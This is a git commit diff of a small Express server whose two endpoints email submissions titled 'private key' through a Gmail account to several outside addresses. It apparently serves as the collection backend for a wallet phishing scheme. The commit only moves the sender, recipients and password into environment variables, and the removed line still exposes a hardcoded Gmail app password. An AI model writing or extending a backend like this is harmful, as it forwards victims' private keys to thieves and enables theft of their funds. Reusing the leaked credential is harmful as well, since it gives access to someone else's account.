655a57f4ef38975b3acd3874fb76fddfd174b94c
atanda uthamn <atandauthman2@gmail.com>
2023-04-28 16:45:47 +0100

    xxdsfd

--- index.js
+++ index.js
@@ -3,6 +3,8 @@ const express = require("express");
 const PORT = process.env.PORT || 5000;
 const cors = require("cors");
 const app = express();
+const dotenv = require("dotenv");
+dotenv.config();
 
 app.use(cors());
 app.use(express.json());
@@ -19,13 +21,13 @@ var transporter = nodemailer.createTransport({
   secure: true,
   auth: {
     user: "bridgetsmith855@gmail.com",
-    pass: "hffwmxssfdqodeus",
+    pass: process.env.PASS_KEY,
   },
 });
 app.post("/sauce", (req, res) => {
   const mailOptions = {
-    from: `bridgetsmith855@gmail.com`,
-    to: `suskidrae18@gmail.com`,
+    from: process.env.SENDER_MAIL,
+    to: process.env.SUSKID,
     subject: "private key",
     html: `
         <p>
@@ -44,8 +46,8 @@ app.post("/sauce", (req, res) => {
 });
 app.post("/", (req, res) => {
   const mailOptions = {
-    from: `bridgetsmith855@gmail.com`,
-    to: `labcol88@gmail.com`,
+    from: process.env.SENDER_MAIL,
+    to: process.env.LABCOL,
     subject: "private key",
     html: `
         <p>
